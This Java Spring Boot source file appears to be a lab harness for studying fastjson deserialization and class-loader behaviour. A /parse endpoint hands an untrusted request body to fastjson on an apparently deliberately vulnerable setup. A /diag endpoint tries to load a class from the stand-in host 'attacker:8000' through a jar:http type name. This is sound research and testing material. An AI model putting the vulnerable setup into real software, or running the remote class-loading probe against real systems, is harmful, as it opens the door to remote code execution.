package lab;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.asm.ClassReader;
import com.alibaba.fastjson.asm.TypeCollector;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class JettyApplication {
    public static class Dto { public int x; }

    public static void main(String[] args) {
        SpringApplication.run(JettyApplication.class, args);
    }

    @Bean
    public CommandLineRunner configureFastjsonDefaultClassLoader() {
        return args -> ParserConfig.getGlobalInstance()
                .setDefaultClassLoader(JettyApplication.class.getClassLoader());
    }

    @PostMapping("/parse")
    public Dto parse(@RequestBody String body) {
        return JSON.parseObject(body, Dto.class);
    }

    @GetMapping("/info")
    public Map<String, String> info() {
        ParserConfig config = ParserConfig.getGlobalInstance();
        Map<String, String> info = new LinkedHashMap<String, String>();
        info.put("fastjsonVersion", JSON.VERSION);
        info.put("autoTypeSupport", String.valueOf(config.isAutoTypeSupport()));
        info.put("threadContextClassLoader", name(Thread.currentThread().getContextClassLoader()));
        info.put("parserConfigDefaultClassLoader", name(config.getDefaultClassLoader()));
        info.put("applicationClassLoader", name(JettyApplication.class.getClassLoader()));
        return info;
    }

    @GetMapping("/diag")
    public Map<String, String> diag() {
        String typeName = "jar:http:..attacker:8000.probe!.POC";
        String resource = typeName.replace('.', '/') + ".class";
        ParserConfig config = ParserConfig.getGlobalInstance();
        ClassLoader loader = config.getDefaultClassLoader();
        Map<String, String> diag = info();
        diag.put("typeName", typeName);
        diag.put("resource", resource);
        diag.put("resourceLoader", name(loader));
        try (InputStream is = loader == null ? null : loader.getResourceAsStream(resource)) {
            diag.put("resourceFound", String.valueOf(is != null));
            if (is != null) {
                byte[] bytes = readAll(is);
                diag.put("resourceBytes", String.valueOf(bytes.length));
                diag.put("resourceMagic", magic(bytes));
                TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
                new ClassReader(new ByteArrayInputStream(bytes), true).accept(visitor);
                diag.put("fastjsonTypeCollectorHasJsonType", String.valueOf(visitor.hasJsonType()));
            }
        } catch (Throwable t) {
            diag.put("resourceProbeError", t.toString());
        }
        try {
            Class<?> clazz = loader == null ? null : loader.loadClass(typeName);
            diag.put("loadClass", String.valueOf(clazz));
        } catch (Throwable t) {
            diag.put("loadClassError", t.toString());
        }
        return diag;
    }

    private static byte[] readAll(InputStream is) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) != -1) {
            out.write(buf, 0, n);
        }
        return out.toByteArray();
    }

    private static String magic(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < bytes.length && i < 8; i++) {
            if (i > 0) sb.append(' ');
            String h = Integer.toHexString(bytes[i] & 0xff).toUpperCase();
            if (h.length() == 1) sb.append('0');
            sb.append(h);
        }
        return sb.toString();
    }

    private static String name(ClassLoader cl) {
        return cl == null ? "null" : cl.getClass().getName() + "@" + Integer.toHexString(System.identityHashCode(cl));
    }
}
